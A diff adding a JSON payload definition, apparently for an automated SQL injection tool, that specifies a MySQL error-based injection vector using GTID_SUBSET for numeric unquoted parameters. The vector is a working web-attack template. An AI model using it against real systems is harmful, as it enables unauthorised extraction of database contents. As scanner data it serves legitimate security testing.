@@ -1,0 +1,12 @@
+{
+ "dbms": "mysql",
+ "technique": "error",
+ "boundary": {
+  "prefix": "",
+  "suffix": "",
+  "type": "numeric",
+  "desc": "numeric unquoted"
+ },
+ "vector": "{B} AND GTID_SUBSET(concat(0x7e,({Q})),1)",
+ "comment": "mysql error via numeric unquoted"
+}
